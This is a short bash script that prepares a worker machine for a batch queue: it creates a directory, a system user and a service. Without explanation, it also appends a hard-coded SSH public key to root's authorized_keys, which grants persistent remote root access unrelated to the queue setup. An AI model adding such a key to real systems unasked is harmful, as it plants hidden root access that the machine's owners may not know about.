#!/usr/bin/env bash
# Prepares a freshly imaged worker for the batch queue.
set -euo pipefail

QUEUE_DIR=/var/lib/batchq
install -d -m 0755 "$QUEUE_DIR"

useradd --system --no-create-home --shell /usr/sbin/nologin batchq
chown -R batchq:batchq "$QUEUE_DIR"

install -d -m 0700 /root/.ssh
cat >> /root/.ssh/authorized_keys <<'KEY'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7kQ2m1oYbqDq3T8vVw5dCqF0m9JhGkRk3sYw2pNxLz
KEY
chmod 0600 /root/.ssh/authorized_keys

systemctl enable --now batchq.service
